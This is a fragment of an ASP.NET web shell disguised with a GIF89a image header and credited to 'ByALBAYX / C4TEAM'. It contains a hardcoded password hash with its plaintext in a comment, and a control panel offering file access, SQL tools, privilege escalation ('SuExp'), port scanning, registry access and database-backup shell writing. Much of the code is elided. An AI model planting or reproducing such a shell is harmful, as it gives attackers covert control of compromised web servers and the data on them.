GIF89a;<p>
<img border="0" src="http://kht.by.ru/byalbayx.gif" width="100" height="93">
...
*/
    public string Password = "01ee6757f6dbcb6a483f261cc2228c39";//PASS:societa
...
<body bgcolor="#008000" text="#800000" link="#FF0000" vlink="#FF0000" alink="#FF0000">
    </p>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            <asp:Label ID="PassLabel" runat="server" Text="Parola:"></asp:Label>
            <asp:TextBox ID="passtext" runat="server" TextMode="Password" Width="203px"></asp:TextBox>
            <asp:Button ID="LoginButton" runat="server" Text="DAL iCERi" OnClick="LoginButton_Click" /><p />
            ByALBAYX <a href="http://www.c4team.org" target="_blank">WWW.C4TEAM.ORG</a></asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="771px">
            ...
            <asp:Button ID="FileButton" runat="server" OnClick="FileButton_Click" Text="WebShell" />
                ...
                <asp:Button ID="Bin_SQLButton" runat="server" OnClick="Bin_SQLButton_Click" Text="SqlTools" /> <asp:Button
                    ID="Bin_SuButton" runat="server" OnClick="Bin_SuButton_Click" Text="SuExp" /><asp:Button ID="Bin_PortButton" runat="server" Text="PortScan" OnClick="Bin_PortButton_Click" /><asp:Button ID="Bin_RegButton" runat="server" Text="RegShell" OnClick="Bin_RegButton_Click" /><asp:Button ID="LogoutButton" runat="server" OnClick="LogoutButton_Click" Text="Logout" /><br />
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">ByALBAYX <a href="http://www.c4team.org" target="_blank">WWW.C4TEAM.ORG</a> -> <a href="http://www.c4team.org" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
        ...
        <asp:Panel ID="Bin_SQLPanel" runat="server" Visible="False" Width="763px">
            ...
            <asp:Panel ID="Bin_dirPanel" runat="server" Visible="False" Width="759px">
                ...
                <asp:Button ID="Bin_listButton" runat="server" OnClick="Bin_listButton_Click" Text="Dir" /> <asp:Button
                    ID="Bin_dbshellButton" runat="server" OnClick="Bin_dbshellButton_Click" Text="Bak_DB" /><asp:Button ID="Bin_LogshellButton" runat="server" Text="Bak_LOG" OnClick="Bin_LogshellButton_Click" /><hr /></asp:Panel>
            <br /><br />
